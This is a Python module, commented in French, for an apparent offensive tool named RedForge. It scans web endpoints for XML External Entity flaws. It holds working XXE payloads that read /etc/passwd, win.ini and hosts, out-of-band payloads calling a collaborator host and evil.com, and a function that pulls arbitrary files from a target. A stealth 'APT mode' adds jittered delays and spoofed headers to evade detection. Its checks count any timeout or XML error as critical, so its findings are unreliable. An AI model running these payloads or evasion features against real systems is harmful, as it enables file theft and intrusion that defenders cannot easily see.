#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de détection XXE pour RedForge
Détecte les vulnérabilités de XML External Entity
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import base64
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

from src.core.stealth_engine import StealthEngine


class XXEScanner:
    """Scanner avancé de vulnérabilités XXE avec support furtif"""
    
    def __init__(self):
        # Payloads XXE
        self.xxe_payloads = {
            "Basic": [
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>''',
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root>&xxe;</root>'''
            ],
            "Blind": [
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{collaborator}/xxe"> %xxe;]>
<root>test</root>''',
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{collaborator}/xxe"> %xxe;]>
<root></root>''',
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{collaborator}/xxe">
%xxe;
]>
<root>test</root>'''
            ],
            "Parameter Entities": [
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
%dtd;
]>
<root>test</root>''',
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
%xxe;
]>
<root>test</root>'''
            ],
            "Error Based": [
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///nonexistent">
%xxe;
]>
<root>test</root>''',
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://localhost/404">
%xxe;
]>
<root>test</root>''',
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://{collaborator}/xxe.dtd">
%dtd;
]>
<root>test</root>'''
            ],
            "Out of Band": [
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{collaborator}/xxe">
%xxe;
]>
<root>&xxe;</root>''',
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "gopher://{collaborator}:8080/_">
%xxe;
]>
<root>test</root>'''
            ],
            "UTF-16 Bypass": [
                '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
                '''<?xml version="1.0" encoding="UTF-16BE"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''
            ]
        }
        
        # Signatures de détection
        self.success_signatures = {
            "etc_passwd": [r'root:.*:0:0:', r'daemon:.*:1:1:', r'bin:.*:2:2:', r'/bin/bash'],
            "win_ini": [r'\[fonts\]', r'\[extensions\]', r'\[mci extensions\]'],
            "hosts": [r'127\.0\.0\.1\s+localhost', r'::1\s+localhost'],
            "error": [r'failed to open stream', r'file_get_contents', r'No such file', r'Connection refused'],
            "xxe_error": [r'ENTITY', r'DOCTYPE', r'XML parser', r'XML parsing', r'Parser error', r'Invalid XML']
        }
        
        # Moteur de furtivité
        self.stealth_engine = StealthEngine()
        self.stealth_mode = False
        self.apt_mode = False
    
    def set_stealth_config(self, config: Dict[str, Any]):
        """
        Configure le mode furtif
        
        Args:
            config: Configuration de furtivité
        """
        self.stealth_mode = config.get('enabled', False)
        self.apt_mode = config.get('apt_mode', False)
        
        if self.stealth_mode:
            self.stealth_engine.set_delays(
                min_delay=config.get('delay_min', 1),
                max_delay=config.get('delay_max', 5),
                jitter=config.get('jitter', 0.3)
            )
            if self.apt_mode:
                self.stealth_engine.enable_apt_mode()
    
    def _apply_stealth_delay(self):
        """Applique un délai furtif"""
        if self.stealth_mode:
            self.stealth_engine.apply_delay()
    
    def _get_headers(self) -> Dict[str, str]:
        """Génère des headers furtifs"""
        if self.stealth_mode:
            return self.stealth_engine.get_headers()
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités XXE
        
        Args:
            target: URL cible
            **kwargs:
                - data: Données XML à tester
                - collaborator: Domaine collaborator pour blind XXE
                - content_type: Content-Type à utiliser
                - deep_scan: Scan approfondi
        """
        print(f"  → Scan des XXE")
        if self.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        vulnerabilities = []
        collaborator = kwargs.get('collaborator')
        
        # Tester différents endpoints XML
        endpoints = self._find_xml_endpoints(target, kwargs.get('data'))
        
        # Limiter les endpoints en mode APT
        if self.apt_mode:
            endpoints = endpoints[:5]
        
        for endpoint, method, data, ct in endpoints:
            # Sélectionner les payloads selon le mode
            categories = ['Basic', 'Error Based']
            if collaborator:
                categories.extend(['Blind', 'Out of Band'])
            if not self.apt_mode:
                categories.extend(['Parameter Entities', 'UTF-16 Bypass'])
            
            for category in categories:
                payloads = self.xxe_payloads.get(category, [])
                # Limiter les payloads en mode APT
                if self.apt_mode:
                    payloads = payloads[:3]
                
                for payload in payloads:
                    self._apply_stealth_delay()
                    
                    # Remplacer collaborator si présent
                    test_payload = payload
                    if collaborator and '{collaborator}' in payload:
                        test_payload = payload.replace('{collaborator}', collaborator)
                    
                    result = self._test_xxe(endpoint, method, data, test_payload, ct)
                    
                    if result['vulnerable']:
                        vulnerabilities.append({
                            "endpoint": endpoint,
                            "method": method,
                            "payload": test_payload[:200] + "..." if len(test_payload) > 200 else test_payload,
                            "category": category,
                            "severity": "CRITICAL",
                            "evidence": result['evidence'],
                            "file_read": result.get('file_read', False),
                            "risk_score": 95,
                            "out_of_band": collaborator is not None and category in ['Blind', 'Out of Band']
                        })
                        print(f"      ✓ XXE trouvée: {endpoint}")
                        break
                else:
                    continue
                break
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "stealth_mode": self.stealth_mode,
            "apt_mode": self.apt_mode,
            "summary": self._generate_summary(vulnerabilities)
        }
    
    def _find_xml_endpoints(self, target: str, data: Optional[str]) -> List[tuple]:
        """Trouve les endpoints qui acceptent du XML"""
        endpoints = []
        
        # Si des données XML sont fournies
        if data and ('xml' in data.lower() or '<?xml' in data):
            endpoints.append((target, 'POST', data, None))
        
        # Tester les endpoints communs
        common_xml_paths = [
            '/xml', '/api/xml', '/soap', '/webservice', '/data.xml',
            '/api/soap', '/api/xml', '/rest/xml', '/xmlrpc', '/api/xmlrpc'
        ]
        
        for path in common_xml_paths:
            test_url = urljoin(target, path)
            endpoints.append((test_url, 'GET', None, None))
            endpoints.append((test_url, 'POST', '<?xml version="1.0"?><root>test</root>', None))
        
        # Tester avec différents Content-Type
        content_types = ['application/xml', 'text/xml', 'application/soap+xml', 
                        'application/xhtml+xml', 'application/rss+xml']
        
        for ct in content_types:
            endpoints.append((target, 'POST', '<?xml version="1.0"?><root>test</root>', ct))
        
        # Éliminer les doublons
        return list(set(endpoints))
    
    def _test_xxe(self, endpoint: str, method: str, data: Optional[str], 
                  payload: str, content_type: Optional[str] = None) -> Dict[str, Any]:
        """Teste un payload XXE"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'file_read': False
        }
        
        headers = self._get_headers()
        if content_type or ('xml' in payload.lower()):
            headers['Content-Type'] = content_type or 'application/xml'
        
        try:
            if method == 'GET':
                response = requests.get(endpoint, headers=headers, timeout=10, verify=False)
                data_to_send = None
            else:
                data_to_send = payload if payload else data
                response = requests.post(endpoint, data=data_to_send, headers=headers,
                                       timeout=15, verify=False)
            
            # Vérifier les signatures
            for sig_type, patterns in self.success_signatures.items():
                for pattern in patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        result['vulnerable'] = True
                        result['evidence'] = pattern
                        result['file_read'] = sig_type in ['etc_passwd', 'win_ini', 'hosts']
                        return result
            
            # Vérifier les erreurs XXE
            xxe_errors = [
                'ENTITY', 'DOCTYPE', 'XML parser', 'XML parsing',
                'Parser error', 'XML declaration', 'Invalid XML',
                'XML Parsing Error', 'DOMException', 'ParseError'
            ]
            for error in xxe_errors:
                if error.lower() in response.text.lower():
                    result['vulnerable'] = True
                    result['evidence'] = error
                    return result
                        
        except requests.exceptions.Timeout:
            result['vulnerable'] = True
            result['evidence'] = 'timeout'
        except requests.exceptions.ConnectionError:
            pass
        except Exception:
            pass
        
        return result
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune XXE détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_category": {
                "basic": len([v for v in vulnerabilities if v['category'] == 'Basic']),
                "blind": len([v for v in vulnerabilities if v['category'] == 'Blind']),
                "error_based": len([v for v in vulnerabilities if v['category'] == 'Error Based']),
                "out_of_band": len([v for v in vulnerabilities if v['category'] == 'Out of Band'])
            },
            "file_read": len([v for v in vulnerabilities if v.get('file_read')]),
            "out_of_band_count": len([v for v in vulnerabilities if v.get('out_of_band')]),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def read_file_via_xxe(self, target: str, file_path: str, **kwargs) -> Optional[str]:
        """
        Tente de lire un fichier via XXE
        
        Args:
            target: URL cible
            file_path: Chemin du fichier à lire
            **kwargs: Options supplémentaires
        """
        if file_path.startswith('/'):
            file_path = 'file://' + file_path
        elif ':' not in file_path:
            file_path = 'file:///' + file_path
        
        payloads = [
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{file_path}">]>
<root>&xxe;</root>''',
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource={file_path.replace('file://', '')}">]>
<root>&xxe;</root>''',
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "{file_path}">
%xxe;
]>
<root>test</root>'''
        ]
        
        endpoints = self._find_xml_endpoints(target, None)
        
        for endpoint, method, data, ct in endpoints:
            for payload in payloads:
                self._apply_stealth_delay()
                try:
                    headers = self._get_headers()
                    if ct:
                        headers['Content-Type'] = ct
                    else:
                        headers['Content-Type'] = 'application/xml'
                    
                    response = requests.post(endpoint, data=payload, headers=headers,
                                           timeout=15, verify=False)
                    
                    # Vérifier si le contenu du fichier est présent
                    if len(response.text) > 100 and not any(error in response.text.lower() 
                       for error in ['error', 'exception', 'failed', 'warning']):
                        # Décoder base64 si nécessaire
                        if 'base64' in payload:
                            try:
                                decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
                                if len(decoded) > 50:
                                    return decoded
                            except:
                                pass
                        return response.text
                    
                except Exception:
                    continue
        
        return None
    
    def blind_xxe(self, target: str, collaborator: str) -> Dict[str, Any]:
        """
        Teste les XXE blind via DNS exfiltration
        
        Args:
            target: URL cible
            collaborator: Domaine collaborator
        """
        blind_payloads = [
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{collaborator}/xxe"> %xxe;]>
<root>test</root>''',
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{collaborator}/xxe">
%xxe;
]>
<root>test</root>''',
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{collaborator}/xxe">]>
<root>&xxe;</root>'''
        ]
        
        results = []
        endpoints = self._find_xml_endpoints(target, None)
        
        for endpoint, method, data, ct in endpoints[:5]:  # Limiter
            for payload in blind_payloads:
                self._apply_stealth_delay()
                try:
                    headers = self._get_headers()
                    if ct:
                        headers['Content-Type'] = ct
                    else:
                        headers['Content-Type'] = 'application/xml'
                    
                    response = requests.post(endpoint, data=payload, headers=headers,
                                           timeout=5, verify=False)
                    
                    # Pas de réponse visible, mais l'exfiltration peut fonctionner
                    results.append({
                        "endpoint": endpoint,
                        "payload": payload[:200],
                        "collaborator": collaborator,
                        "potential": True
                    })
                    print(f"      ✓ Potentielle XXE blind: {endpoint}")
                    
                except Exception:
                    pass
        
        return {
            "vulnerabilities": results,
            "count": len(results)
        }
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques du scanner"""
        return {
            "stealth_mode": self.stealth_mode,
            "apt_mode": self.apt_mode,
            "payloads_count": sum(len(p) for p in self.xxe_payloads.values())
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    print("=" * 60)
    print("Test de XXEScanner")
    print("=" * 60)
    
    scanner = XXEScanner()
    
    # Configuration mode APT
    scanner.set_stealth_config({
        'enabled': True,
        'apt_mode': True,
        'delay_min': 2,
        'delay_max': 5
    })
    
    # Test (simulé)
    # results = scanner.scan("https://example.com/xml")
    # print(f"XXE trouvées: {results['count']}")
    
    print("\n✅ Module XXEScanner chargé avec succès")